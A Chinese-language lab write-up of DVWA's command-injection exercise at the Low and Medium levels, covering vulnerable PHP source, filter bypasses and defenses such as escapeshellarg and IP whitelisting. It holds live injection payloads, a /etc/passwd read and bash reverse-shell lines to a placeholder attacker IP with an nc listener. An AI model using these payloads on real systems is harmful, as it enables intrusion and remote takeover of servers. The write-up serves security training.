# DVWA Command Injection Low & Medium WriteUp

## 一、漏洞概述

**命令注入（Command Injection）** 是指应用程序调用了系统命令执行函数，并且将用户输入拼接进命令字符串中，导致攻击者可以注入额外的系统命令并执行。DVWA 的 **Command Injection** 模块模拟了一个 ping 功能：用户输入一个 IP 地址，服务器执行 `ping` 命令并返回结果。如果输入未经过滤，攻击者就可以在 IP 后面拼接其他命令，从而在服务器上执行任意系统命令。

将 DVWA 安全级别分别设置为 **Low** 和 **Medium**，进入 **Command Injection** 模块。

---

## 二、Low 难度

### 1\. 源码分析

查看 Low 级别源码：

```php
<?php
if (isset($_POST['Submit'])) {
    $target = $_REQUEST['ip'];

    if (stristr(php_uname('s'), 'Windows NT')) {
        $cmd = shell_exec('ping ' . $target);
    } else {
        $cmd = shell_exec('ping -c 4 ' . $target);
    }

    echo "<pre>{$cmd}</pre>";
}
?>
```

关键点：

1. `ip` 参数通过 POST 提交，未经过任何过滤。
2. 直接拼接到 `ping` 命令中，使用 `shell_exec()` 执行。
3. 攻击者可以注入命令分隔符，执行额外命令。

### 2\. 手工测试

#### 正常请求

输入：

```text
127.0.0.1
```

页面返回 ping 结果。

#### 测试命令分隔符

Linux 下常用的命令分隔符：

| 符号   | 作用                           |
| --- | --- |
| `;`    | 顺序执行，无论前一个是否成功   |
| `&&`   | 前一个成功才执行后一个         |
| `\|\|` | 前一个失败才执行后一个         |
| `\|`   | 管道，前一个输出作为后一个输入 |
| `&`    | 后台执行                       |
| `%0a`  | 换行符，URL 编码               |

提交：

```text
127.0.0.1; whoami
```

页面返回 ping 结果以及当前用户，说明命令注入存在。

也可以使用：

```text
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 || whoami
```

#### 读取敏感文件

```text
127.0.0.1; cat /etc/passwd
```

Windows 下：

```text
127.0.0.1 & type C:\Windows\win.ini
```

#### 反弹 Shell

```text
127.0.0.1; bash -i >& /dev/tcp/攻击者IP/4444 0>&1
```

攻击机监听：

```bash
nc -lvp 4444
```

### 3\. Burp Suite 验证

用 Burp 拦截请求：

```http
POST /dvwa/vulnerabilities/exec/ HTTP/1.1
Host: 靶机IP
Cookie: PHPSESSID=...; security=low
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1&Submit=Submit
```

将 `ip` 修改为：

```text
ip=127.0.0.1; whoami&Submit=Submit
```

发送后观察响应中是否包含命令执行结果。

---

## 三、Medium 难度

### 1\. 源码分析

查看 Medium 级别源码：

```php
<?php
if (isset($_POST['Submit'])) {
    $target = $_REQUEST['ip'];

    // 过滤危险字符
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );
    $target = str_replace(array_keys($substitutions), $substitutions, $target);

    if (stristr(php_uname('s'), 'Windows NT')) {
        $cmd = shell_exec('ping ' . $target);
    } else {
        $cmd = shell_exec('ping -c 4 ' . $target);
    }

    echo "<pre>{$cmd}</pre>";
}
?>
```

关键点：

1. 使用 `str_replace` 将 `&&` 和 `;` 替换为空。
2. 过滤是**非递归**的，且只过滤了这两个符号。
3. 其他命令分隔符如 `|`、`||`、`&`、`%0a` 等未被过滤。
4. 仍然直接拼接命令并执行。

### 2\. 过滤机制分析

Medium 的过滤列表：

```php
'&&' => '',
';'  => '',
```

这意味着：

- 输入 `;` 会被删除，无法使用分号。
- 输入 `&&` 会被删除，无法使用逻辑与。
- 但 `|`、`||`、`&`、`$()`、反引号、换行符等仍然可用。

### 3\. 绕过方法

#### 方法一：使用管道符 `|`

```text
127.0.0.1 | whoami
```

`|` 未被过滤，可以执行命令。

#### 方法二：使用 `||`

```text
127.0.0.1 || whoami
```

#### 方法三：使用单个 `&`

```text
127.0.0.1 & whoami
```

`&` 未被过滤，在 Linux 下表示后台执行，但命令仍会执行。

#### 方法四：使用换行符 `%0a`

```text
127.0.0.1%0awhoami
```

URL 解码后为：

```text
127.0.0.1
whoami
```

换行符在 shell 中相当于命令分隔符。

#### 方法五：使用 `$(...)` 或反引号

```text
127.0.0.1 $(whoami)
127.0.0.1 `whoami`
```

命令替换会先执行括号内的命令，再作为 ping 的参数。

#### 方法六：双写绕过 `&&` 或 `;`

如果过滤是一次性替换，可以双写：

```text
127.0.0.1 &;& whoami
```

输入 `&;&`，其中 `;` 会被删除，剩下 `&&`，从而变成 `&&` 执行。

类似地：

```text
127.0.0.1 &;&;& whoami
```

但更简单的是直接用 `|`。

### 4\. 手工利用

#### 基础命令执行

```text
127.0.0.1 | whoami
```

#### 读取文件

```text
127.0.0.1 | cat /etc/passwd
```

#### 反弹 Shell

```text
127.0.0.1 | bash -i >& /dev/tcp/攻击者IP/4444 0>&1
```

### 5\. Burp 改包

拦截请求，将 `ip` 修改为：

```text
ip=127.0.0.1 | whoami&Submit=Submit
```

或使用 URL 编码换行：

```text
ip=127.0.0.1%0awhoami&Submit=Submit
```

发送后即可看到命令执行结果。

---

## 四、Low 与 Medium 对比

| 对比项     | Low                                 | Medium                                  |
| --- | --- | --- |
| 过滤       | 无                                  | `str_replace` 删除 `&&` 和 `;`          |
| 可用分隔符 | `;`、`&&`、`\|\|`、`\|`、`&`、`%0a` | `\|`、`\|\|`、`&`、`%0a`、`$()`、反引号 |
| 绕过难度   | 无                                  | 低，使用 `\|` 即可                      |
| 根本问题   | 无过滤                              | 黑名单不完整，且未使用 `escapeshellarg` |

---

## 五、防御措施

1. **避免直接拼接命令**  
   尽量不要调用系统命令。如果必须调用，使用参数化方式，例如 PHP 的 `escapeshellarg()` 和 `escapeshellcmd()`：
   ```php
    $target = escapeshellarg($_POST['ip']);
    $cmd = shell_exec('ping -c 4 ' . $target);
   ```

    `escapeshellarg()` 会将参数用单引号包裹，并转义其中的单引号，防止命令注入。
2. **白名单校验**  
   对 IP 地址进行严格校验，例如使用 `filter_var($ip, FILTER_VALIDATE_IP)`：
   ```php
    if (!filter_var($_POST['ip'], FILTER_VALIDATE_IP)) {
        die("Invalid IP address");
    }
   ```
3. **使用安全的 API**  
   如果只是 ping，可以使用语言内置的网络库，而不是调用系统命令。
4. **最小权限原则**  
   Web 服务运行账户应只具备必要权限，避免攻击者执行高权限命令。
5. **禁用危险函数**  
   在 `php.ini` 中禁用 `shell_exec`、`exec`、`system`、`passthru` 等函数：
   ```ini
    disable_functions = shell_exec,exec,system,passthru,popen,proc_open
   ```

---

## 六、总结

- **Low**：完全无过滤，直接使用 `;`、`&&`、`|` 等分隔符即可执行任意命令。
- **Medium**：过滤了 `&&` 和 `;`，但未过滤 `|`、`||`、`&`、`%0a`、`$()`、反引号等，使用 `127.0.0.1 | whoami` 即可绕过。
- **核心教训**：命令注入的防御不能依赖黑名单，必须使用白名单校验或 `escapeshellarg()` 进行参数转义，并遵循最小权限原则。

> 本文仅用于 DVWA 靶场学习与授权测试，请遵守法律法规。